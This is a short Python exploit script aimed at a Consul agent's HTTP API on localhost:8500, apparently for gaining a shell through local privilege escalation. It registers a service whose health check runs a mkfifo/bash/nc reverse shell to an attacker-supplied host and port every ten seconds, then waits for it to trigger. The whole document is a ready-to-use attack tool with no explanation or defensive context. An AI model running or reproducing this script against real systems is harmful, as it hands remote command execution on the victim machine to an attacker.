#!/usr/bin/env python

import requests
import sys

PORT = sys.argv[2]
HOST = sys.argv[1]

CONSUL_TOKEN = ""

URL = "http://localhost:8500"
SERVICE_NAME= "xpl_service"
headers = {"X-Consul-Token":CONSUL_TOKEN, "Content-Type":"application/json"}
CMD = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {HOST} {PORT} >/tmp/f"

data= {"ID":"xpl","Name":SERVICE_NAME,"Address":"127.0.0.1","Port":80,"check":{"Args":["sh","-c",CMD],"interval":"10s","Timeout":"86400s"}}

r = requests.put(URL + "/v1/agent/service/register", json=data, headers=headers)
print("[+] Wait for the service to trigger")
